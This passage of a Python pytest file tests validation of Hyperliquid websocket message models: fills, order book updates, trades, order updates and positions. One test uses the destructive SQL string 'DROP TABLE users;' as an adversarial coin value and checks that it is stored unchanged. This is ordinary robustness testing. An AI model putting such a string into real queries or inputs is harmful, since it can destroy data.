        "side": "B",
        "time": frozen_time_ms,  # Use frozen timestamp
        "hash": "abc123",
        "oid": 42,
        "cloid": "0x" + "0" * 30 + "7b",  # Valid 128-bit hex string
        "isMaker": True,
    }
    model = HyperliquidRawWsFillEvent.model_validate(obj)
    assert model.coin == "ETH"
    assert model.px == "3000"  # Business logic normalizes decimal strings
    assert model.is_maker is True


def test_ws_fill_event_missing_required() -> None:
    """Test ws fill event missing required."""
    obj: dict[str, object] = {"coin": "ETH", "px": "3000.0"}
    with pytest.raises(ValidationError):
        HyperliquidRawWsFillEvent.model_validate(obj)


def test_ws_fill_event_type_errors() -> None:
    """Test ws fill event type errors."""
    obj: dict[str, object] = {
        "coin": 123,
        "px": 3000.0,
        "sz": 1.5,
        "side": 1,
        "time": "now",
        "hash": 123,
        "oid": "oid",
        "cloid": 123,
        "isMaker": "yes",
    }
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawWsFillEvent.model_validate(obj)


def test_ws_fill_event_constraint_errors() -> None:
    """Test ws fill event constraint errors."""
    obj: dict[str, object] = {
        "coin": "E" * 65,
        "px": "NaN",
        "sz": "inf",
        "side": "X",
        "time": -1,
        "hash": "h" * 65,
        "oid": -1,
        "cloid": "0x" + "c" * 65,  # Invalid - too long
        "isMaker": False,
    }
    with pytest.raises((ValidationError, TypeFieldError)):
        HyperliquidRawWsFillEvent.model_validate(obj)


def test_ws_fill_event_optional_cloid(freezer: FreezerProtocol) -> None:
    """Test ws fill event optional cloid."""
    freezer.move_to("2025-01-15 12:00:00")
    frozen_time_ms = int(datetime.now(UTC).timestamp() * 1000)
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "A",
        "time": frozen_time_ms,
        "hash": "abc123",
        "oid": 42,
        "isMaker": False,
    }
    model = HyperliquidRawWsFillEvent.model_validate(obj)
    assert model.cloid is None


def test_ws_fill_event_extra_field() -> None:
    """Test ws fill event extra field."""
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "B",
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "hash": "abc123",
        "oid": 42,
        "cloid": "0x" + "0" * 30 + "7b",  # Valid 128-bit hex string
        "isMaker": True,
        "foo": 1,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawWsFillEvent.model_validate(obj)


def test_ws_fill_event_adversarial_strings(freezer: FreezerProtocol) -> None:
    """Test ws fill event adversarial strings."""
    freezer.move_to("2025-01-15 12:00:00")
    frozen_time_ms = int(datetime.now(UTC).timestamp() * 1000)
    obj: dict[str, object] = {
        "coin": "DROP TABLE users;",
        "px": "123.456",
        "sz": "789.012",
        "side": "A",
        "time": frozen_time_ms,
        "hash": "abc123",
        "oid": 1,
        "cloid": "0x" + "0" * 30 + "7b",  # Valid 128-bit hex string
        "isMaker": False,
    }
    model = HyperliquidRawWsFillEvent.model_validate(obj)
    assert model.coin == "DROP TABLE users;"


def test_ws_book_update_happy_path() -> None:
    """Test ws book update happy path."""
    obj: dict[str, object] = {
        "coin": "BTC",
        "levels": [
            [
                {"px": "30000.0", "sz": "1.0", "n": 2},
            ],
            [
                {"px": "30010.0", "sz": "0.5", "n": 1},
            ],
        ],
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
    }
    model = HyperliquidRawWsBookUpdate.model_validate(obj)
    assert model.coin == "BTC"
    assert isinstance(model.levels[0][0], HyperliquidRawBookLevel)


def test_ws_book_update_invalid_levels() -> None:
    """Test ws book update invalid levels."""
    obj: dict[str, object] = {
        "coin": "BTC",
        "levels": [[], []],
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
    }
    model = HyperliquidRawWsBookUpdate.model_validate(obj)
    assert model.levels == [[], []]
    # Now test wrong structure
    obj2: dict[str, object] = {
        "coin": "BTC",
        "levels": [[], [], []],
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
    }
    with pytest.raises(ValidationError):
        HyperliquidRawWsBookUpdate.model_validate(obj2)


def test_ws_book_update_type_errors() -> None:
    """Test ws book update type errors."""
    obj: dict[str, object] = {
        "coin": 123,
        "levels": "notalist",
        "time": "now",
    }
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawWsBookUpdate.model_validate(obj)


def test_ws_book_update_extra_field() -> None:
    """Test ws book update extra field."""
    obj: dict[str, object] = {
        "coin": "BTC",
        "levels": [[], []],
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "foo": 1,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawWsBookUpdate.model_validate(obj)


def test_ws_book_update_only_bids_or_asks() -> None:
    """Test ws book update only bids or asks."""
    # Only bids (should be rejected)
    obj: dict[str, object] = {
        "coin": "BTC",
        "levels": [[{"px": "30000.0", "sz": "1.0", "n": 2}]],
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
    }
    with pytest.raises(ValidationError):
        HyperliquidRawWsBookUpdate.model_validate(obj)
    # Only asks (should be rejected)
    obj2: dict[str, object] = {
        "coin": "BTC",
        "levels": [[], [{"px": "30010.0", "sz": "0.5", "n": 1}]],
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
    }
    model = HyperliquidRawWsBookUpdate.model_validate(obj2)
    assert model.levels[0] == []
    assert isinstance(model.levels[1][0], HyperliquidRawBookLevel)


def test_ws_book_update_empty_lists() -> None:
    """Test ws book update empty lists."""
    # Both bids and asks empty
    obj: dict[str, object] = {"coin": "BTC", "levels": [[], []], "time": 1234567890}
    model = HyperliquidRawWsBookUpdate.model_validate(obj)
    assert model.levels == [[], []]


def test_ws_trade_event_happy_path() -> None:
    """Test ws trade event happy path."""
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "A",
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "hash": "abc123",
        "tid": 12345,
        "users": ["0x1234567890abcdef1234567890abcdef12345678"],
    }
    model = HyperliquidRawWsTradeEvent.model_validate(obj)
    assert model.coin == "ETH"
    assert model.side == "A"


def test_ws_trade_event_missing_required() -> None:
    """Test ws trade event missing required."""
    obj: dict[str, object] = {"coin": "ETH", "px": "3000.0"}

    with pytest.raises((ValidationError, TypeFieldError)):
        HyperliquidRawWsTradeEvent.model_validate(obj)


def test_ws_trade_event_type_errors() -> None:
    """Test ws trade event type errors."""
    obj: dict[str, object] = {
        "coin": 123,
        "px": 3000.0,
        "sz": 1.5,
        "side": 1,
        "time": "now",
        "hash": 123,
        "tid": "invalid",
        "users": "not_a_list",
    }
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawWsTradeEvent.model_validate(obj)


def test_ws_trade_event_constraint_errors() -> None:
    """Test ws trade event constraint errors."""
    obj: dict[str, object] = {
        "coin": "E" * 65,
        "px": "NaN",
        "sz": "inf",
        "side": "X",
        "time": -1,
        "hash": "h" * 65,
        "tid": -1,
        "users": [],
    }

    with pytest.raises((ValidationError, TypeFieldError)):
        HyperliquidRawWsTradeEvent.model_validate(obj)


def test_ws_trade_event_extra_field() -> None:
    """Test ws trade event extra field."""
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "B",
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "hash": "abc123",
        "tid": 12345,
        "users": ["0x1234567890abcdef1234567890abcdef12345678"],
        "foo": 1,
    }

    with pytest.raises((ValidationError, TypeFieldError)):
        HyperliquidRawWsTradeEvent.model_validate(obj)


def test_ws_trade_event_side_lowercase_invalid() -> None:
    """Test ws trade event side lowercase invalid."""
    # side as lowercase or invalid
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "b",
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "hash": "abc123",
        "tid": 12345,
        "users": ["0x1234567890abcdef1234567890abcdef12345678"],
    }

    with pytest.raises((ValidationError, TypeFieldError)):
        HyperliquidRawWsTradeEvent.model_validate(obj)
    obj2: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "X",
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "hash": "abc123",
        "tid": 12345,
        "users": ["0x1234567890abcdef1234567890abcdef12345678"],
    }
    with pytest.raises(ValidationError):
        HyperliquidRawWsTradeEvent.model_validate(obj2)
    obj3: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": " ",
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "hash": "abc123",
        "tid": 12345,
        "users": ["0x1234567890abcdef1234567890abcdef12345678"],
    }

    with pytest.raises((ValidationError, EmptyStringError)):
        HyperliquidRawWsTradeEvent.model_validate(obj3)


def test_ws_order_update_happy_path() -> None:
    """Test ws order update happy path."""
    obj: dict[str, object] = {
        "eventType": "orderUpdate",
        "data": {"foo": "bar"},
    }
    model = HyperliquidRawWsOrderUpdate.model_validate(obj)
    assert model.event_type == "orderUpdate"
    assert model.data == {"foo": "bar"}


def test_ws_order_update_missing_required() -> None:
    """Test ws order update missing required."""
    obj: dict[str, object] = {"eventType": "orderUpdate"}
    with pytest.raises(ValidationError):
        HyperliquidRawWsOrderUpdate.model_validate(obj)


def test_ws_order_update_type_errors() -> None:
    """Test ws order update type errors."""
    obj: dict[str, object] = {"eventType": 123, "data": "notadict"}
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawWsOrderUpdate.model_validate(obj)


def test_ws_order_update_empty_data() -> None:
    """Test ws order update empty data."""
    obj: dict[str, object] = {"eventType": "orderUpdate", "data": {}}
    with pytest.raises(ValidationError):
        HyperliquidRawWsOrderUpdate.model_validate(obj)


def test_ws_order_update_extra_field() -> None:
    """Test ws order update extra field."""
    obj: dict[str, object] = {"eventType": "orderUpdate", "data": {"foo": "bar"}, "foo": 1}
    with pytest.raises(ValidationError):
        HyperliquidRawWsOrderUpdate.model_validate(obj)


def test_ws_order_update_unknown_event_type() -> None:
    """Test ws order update unknown event type."""
    # eventType as unknown string
    obj: dict[str, object] = {"eventType": "unknownType", "data": {"foo": "bar"}}
    model = HyperliquidRawWsOrderUpdate.model_validate(obj)
    assert model.event_type == "unknownType"


def test_ws_position_update_event_happy_path() -> None:
    """Test ws position update event happy path."""
    obj: dict[str, object] = {
        "asset": "ETH",
        "position": {
            "coin": "ETH",
            "entryPx": "3000.0",
            "leverage": {"type": "cross", "value": 10},
            "liquidationPx": "2900.0",
            "marginUsed": "100.0",
            "maxLeverage": 50,
            "positionValue": "150.0",
            "returnOnEquity": "0.1",
            "szi": "1.5",
            "unrealizedPnl": "10.0",
        },
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
    }
    model = HyperliquidRawWsPositionUpdateEvent.model_validate(obj)
    assert model.asset == "ETH"
    assert isinstance(model.position, HyperliquidRawPositionInfo)


def test_ws_position_update_event_missing_required() -> None:
    """Test ws position update event missing required."""
    obj: dict[str, object] = {"asset": "ETH", "position": {}}
    with pytest.raises(ValidationError):
        HyperliquidRawWsPositionUpdateEvent.model_validate(obj)


def test_ws_position_update_event_type_errors() -> None:
    """Test ws position update event type errors."""
    obj: dict[str, object] = {"asset": 123, "position": "notadict", "time": "now"}
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawWsPositionUpdateEvent.model_validate(obj)


def test_ws_position_update_event_extra_field() -> None:
    """Test ws position update event extra field."""
    obj: dict[str, object] = {
        "asset": "ETH",
        "position": {
            "coin": "ETH",
            "entryPx": "3000.0",
            "leverage": {"type": "cross", "value": 10},
            "liquidationPx": "2900.0",
            "marginUsed": "100.0",
            "maxLeverage": 50,
            "positionValue": "150.0",
            "returnOnEquity": "0.1",
            "szi": "1.5",
            "unrealizedPnl": "10.0",
        },
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "foo": 1,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawWsPositionUpdateEvent.model_validate(obj)


def test_ws_position_update_missing_optional_fields() -> None:
    """Test ws position update missing optional fields."""
    # position with only required fields
    obj: dict[str, object] = {
        "asset": "ETH",
        "position": {
            "coin": "ETH",
            "leverage": {"type": "cross", "value": 10},
            "marginUsed": "100.0",
            "maxLeverage": 50,
            "positionValue": "150.0",
            "returnOnEquity": "0.1",
            "szi": "1.5",
            "unrealizedPnl": "10.0",
        },
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
    }
    model = HyperliquidRawWsPositionUpdateEvent.model_validate(obj)
    assert model.asset == "ETH"


def test_ws_position_update_all_zero_negative_large() -> None:
    """Test ws position update all zero negative large."""
    # All fields as zero, negative, or large
    obj: dict[str, object] = {
        "asset": "BTC",
        "position": {
            "coin": "BTC",
            "entryPx": "0",
            "leverage": {"type": "cross", "value": 1},
            "liquidationPx": "0",
            "marginUsed": "0",
            "maxLeverage": 1,
            "positionValue": "0",
            "returnOnEquity": "0",
            "szi": "0",
            "unrealizedPnl": "0",
        },
        "time": 0,
    }
    model = HyperliquidRawWsPositionUpdateEvent.model_validate(obj)
    assert model.asset == "BTC"
    obj2: dict[str, object] = {
        "asset": "BTC",
        "position": {
            "coin": "BTC",
            "entryPx": "-1",
            "leverage": {"type": "cross", "value": -1},
            "liquidationPx": "-1",
            "marginUsed": "-1",
            "maxLeverage": -1,
            "positionValue": "-1",
            "returnOnEquity": "-1",
            "szi": "-1",
            "unrealizedPnl": "-1",
        },
        "time": -1,
    }
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawWsPositionUpdateEvent.model_validate(obj2)
    obj3: dict[str, object] = {
        "asset": "BTC",
        "position": {
            "coin": "BTC",
            "entryPx": "1e1000",
            "leverage": {"type": "cross", "value": 1e1000},
            "liquidationPx": "1e1000",
            "marginUsed": "1e1000",
            "maxLeverage": 1e1000,
            "positionValue": "1e1000",
            "returnOnEquity": "1e1000",
            "szi": "1e1000",
            "unrealizedPnl": "1e1000",
        },
        "time": 2**63 - 1,
    }
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawWsPositionUpdateEvent.model_validate(obj3)


def test_ws_fill_event_cloid_empty_string() -> None:
    """Test ws fill event cloid empty string."""
    # cloid as empty string (should be rejected)
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "B",
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "hash": "abc123",
        "oid": 42,
        "cloid": "",  # Invalid - empty string
        "isMaker": True,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawWsFillEvent.model_validate(obj)


def test_ws_fill_event_cloid_omitted(freezer: FreezerProtocol) -> None:
    """Test ws fill event cloid omitted."""
    freezer.move_to("2025-01-15 12:00:00")
    frozen_time_ms = int(datetime.now(UTC).timestamp() * 1000)
    # cloid omitted
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "B",
        "time": frozen_time_ms,
        "hash": "abc123",
        "oid": 42,
        "isMaker": True,
    }
    model = HyperliquidRawWsFillEvent.model_validate(obj)
    assert model.cloid is None


def test_ws_fill_event_cloid_very_long() -> None:
    """Test ws fill event cloid very long."""
    # cloid very long (should be rejected)
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "B",
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "hash": "abc123",
        "oid": 42,
        "cloid": "0x" + "c" * 100,  # Invalid - too long
        "isMaker": True,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawWsFillEvent.model_validate(obj)


def test_ws_fill_event_hash_unicode_control(freezer: FreezerProtocol) -> None:
    """Test ws fill event hash unicode control."""
    freezer.move_to("2025-01-15 12:00:00")
    frozen_time_ms = int(datetime.now(UTC).timestamp() * 1000)
    # hash with unicode or control characters
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "B",
        "time": frozen_time_ms,
        "hash": "abc\n123",
        "oid": 42,
        "cloid": "0x" + "0" * 30 + "7b",  # Valid 128-bit hex string
        "isMaker": True,
    }
    model = HyperliquidRawWsFillEvent.model_validate(obj)
    assert model.hash == "abc\n123"


def test_ws_event_fields_set_to_none() -> None:
    """Test ws event fields set to none."""
    # Fields present but set to None (should be rejected if not optional)
    obj: dict[str, object] = {
        "coin": None,
        "px": None,
        "sz": None,
        "side": None,
        "time": None,
        "hash": None,
        "oid": None,
        "cloid": None,
        "isMaker": None,
    }
    with pytest.raises((ValidationError, TypeError)):
        HyperliquidRawWsFillEvent.model_validate(obj)


def test_ws_event_extra_fields_everywhere() -> None:
    """Test ws event extra fields everywhere."""
    # Extra fields at every level (should be rejected)
    obj: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "B",
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "hash": "abc123",
        "oid": 42,
        "cloid": "0x" + "0" * 30 + "7b",  # Valid 128-bit hex string
        "isMaker": True,
        "foo": 1,
    }
    with pytest.raises(ValidationError):
        HyperliquidRawWsFillEvent.model_validate(obj)
    obj2: dict[str, object] = {
        "coin": "ETH",
        "px": "3000.0",
        "sz": "1.5",
        "side": "B",
        "time": int(datetime.now(UTC).timestamp() * 1000),  # Current timestamp in milliseconds
        "hash": "abc123",
        "oid": 42,
        "cloid": "0x" + "0" * 30 + "7b",  # Valid 128-bit hex string
        "isMaker": True,
        "position": {"coin": "ETH", "foo": 1},
    }
    with pytest.raises(ValidationError):
        HyperliquidRawWsPositionUpdateEvent.model_validate(obj2)
